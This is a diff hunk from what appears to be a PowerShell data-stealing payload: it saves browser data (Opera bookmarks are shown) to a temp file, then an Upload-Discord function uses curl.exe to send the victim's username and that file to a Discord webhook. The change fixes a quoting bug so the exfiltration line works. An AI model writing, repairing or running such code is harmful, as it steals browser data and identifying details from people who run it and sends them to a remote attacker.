@@ -48,7 +48,7 @@ Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData
 
 function Upload-Discord {
   $wh = "https://discord.com/api/webhooks/$wh"
-  curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"$env:username\`"}" -F "file=@\`"$env:TMP\--BrowserData.txt`"" $wh
+  curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"$env:username\`"}" -F "file=@\`"$env:TMP\--BrowserData.txt\`"" $wh
 }
 
 Upload-Discord
